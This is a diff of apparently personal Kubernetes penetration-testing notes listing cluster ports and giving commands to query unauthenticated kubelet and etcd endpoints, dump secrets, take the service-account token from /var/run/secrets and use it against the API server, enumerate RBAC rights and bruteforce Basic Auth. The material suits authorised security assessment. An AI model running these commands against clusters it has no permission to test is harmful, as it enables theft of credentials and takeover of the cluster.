@@ -1,49 +1,91 @@
-Attack Surface once you have a container in the cluster
-	all API ports
-	service tokens
-	other container network services
-	Linux kernel
-	cloud API Metadata services (cloud only)
+Nmap
+	Watch out for unauthenticated services 
+		esp MongoDB
+		sim internal network review
 
-API remote - typically 443, 6443, 8443 - can be any (configurable on launch)
+	API remote port can be any (configurable on launch)
+	443 - API remote secure port - common
 
-Controller Manager - TCP 10251 
-	metrics and health info - unauth disclosure finding
+	2379 - etcd client communication
+	2380 - etcd inter-cluster communication
 
-etcd - TCP 2379 - client communication
-	TCP 2380 - inter-cluster communication
+	6443 - API remote default secure port 
+	8080 - API remote default insecure port
+	8443 - API remote secure port - common
 
-kubelet - TCP 10250, 10255 (older)
-	manages container runtime (usually Docker/containerd/CRI-O)
+	10250 - kubelet
+			read-write
+			kubelet API endpoints - https://github.com/cyberark/kubeletctl/blob/master/API_TABLE.md
+	10251 - Controller Manager 
+			metrics and health info (unauth disclosure finding)
+	10255 - kubelet (older) 
+			read-only
+			kubelet API endpoints - https://github.com/cyberark/kubeletctl/blob/master/API_TABLE.md
+	10256 - kube-proxy 
+			handles mapping services to pods
+			forwards traffic to containers
+			health and metrics info
 
-kube-proxy - TCP 10256
-	handles mapping services to pods
-	forwards traffic to containers
-	health and metrics info
+	30000-32767 - node port services, including Tiller
 
-Service tokens
-	JWT @ /var/run/secrets/kubernetes.io/serviceaccount/token
-	created by default in all containers
-	in all older versions and some newer versions, this is a cluster admin token
 
-K8s Environment Variables
-	created in every container
-	`env` will return location of API server:
-		KUBERNETES_PORT
-		KUBERNETES_PORT_443_TCP_ADDR
-		KUBERNETES_SERVICE_HOST
+Indicators you're in a pod
+	/etc/hosts
+		# Kubernetes-managed hosts file._127.0.0.1_localhost_::1_localhost ip6-localhost ip6-loopback_fe00::0_ip6-localnet_fe00::0_ip6-
 
-Service Tokens + Environment Variables 
-	From a pod (not node!), list all other pods in a namespace
-		kubectl get pod -n kube-system
 
-When scanning, watch out for unauthenticated services 
-	esp MongoDB
-	sim internal network review
+Query Insecure Port
+	kubectl -s http://<node_IP>:8080 <command>
+
+Query unauthenticated rw kubelet API
+	curl https://172.18.0.4:10250/pods -k | jq
+	
+Query unauthenticated ro kubelet API
+	curl http://172.18.0.4:10255/pods -k | jq
+		run and exec endpoints will return 405
+
+Query unauthenticated etcd
+	export ETCDCTL_API=3
+
+	etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=172.18.0.4:2379 get / --prefix --keys-only
+
+Check for Tiller
+	helm --host <target_IP>:<tiller_port> version
+
+	from within cluster, can check DNS - tiller.kube-system.service?
+	
+
+
+List API resources
+	kubectl api-resources | grep -v "NAME" | cut -d " " -f1
+
+List namespaces (defaults = default, kube-public, kube-system)
+	kubectl get namespaces | grep -v "NAME" | cut -d " " -f1
+
+For each accessible namespace gather info
+	kubectl get po,svc,roles,rolebindings,clusterroles,clusterrolebindings,networkpolicies,psp,no,ns,pv,pvc,rc,crds,ds,deploy,rs,sts,ing --all-namespaces -o wide
+
+For each namespace gather permissions
+	kubectl -n <namepsace> auth can-i --list
+
+Find and read any available secrets
+	kubectl get secrets
+	kubectl get secret <SECRET_NAME> -o yaml 
+
+	Get service account token "default-token-..."
+		created by default in all containers
+		in all older versions and some newer versions, this is a cluster-admin token
+
+
 
 Check Service Account Permissions
 	often the default service account is given too many rights
 		new pods will get default service account by default
+
+	kubectl auth can-i --as <subject> <kubectl_command>
+		if running as cluster-admin, will return yes regardless (rights is *)
+			`can-i get donuts` will return error but true
+
 
 Identify servers with Basic Auth enabled
 	curl and pass creds to API server as above
@@ -51,13 +93,50 @@ Identify servers with Basic Auth enabled
 		401 - enabled, user/pass incorrect
 	if no account lockout, can bruteforce
 
+
+
+
+Inside a pod
+	Gather k8s environment variables
+		env | grep -i kube
+
+		created in every container
+			KUBERNETES_PORT
+			KUBERNETES_PORT_443_TCP_ADDR
+			KUBERNETES_SERVICE_HOST
+
+	If service account token available
+		Get API-Server IP
+			Get pod IP - API will likely be at base of that IP range
+		Get JWT access token 
+			kubectl get secret default-token-...
+			OR 
+			/var/run/secrets/kubernetes.io/serviceaccount/token		
+		Create TOKEN variable for ease of use
+			$TOKEN="<decoded JWT>"
+		Test access to API server
+			curl -X GET https://<API_SERVER_IP>/api --header "Authorization: Bearer $TOKEN" --insecure
+
+
+
+Check for Basic Auth
+	curl -sk --user user1:mypass https://<IP>:<port>/api/...
+
+	identify servers with Basic Auth enabled
+			curl and pass creds to API server as above
+				403 - not enabled
+				401 - enabled, user/pass incorrect
+			no account lockout - can bruteforce if enabled
+
+
+
+
+
+Testing creds usually come as .kube/config file
+	look for these in dev systems
+
 Check repos for CA key files
 	provides access to whole cluster for life of key (10y by default)
-
-Read-only access can still be dangerous 
-	esp. cluster-wide reda-only
-	e.g. GET on secrets
-		kubectl get secrets
 
 Check RBAC rights applied to clusters
 	esp. 3rd-party intalls - sim to dangers of curl-bashing
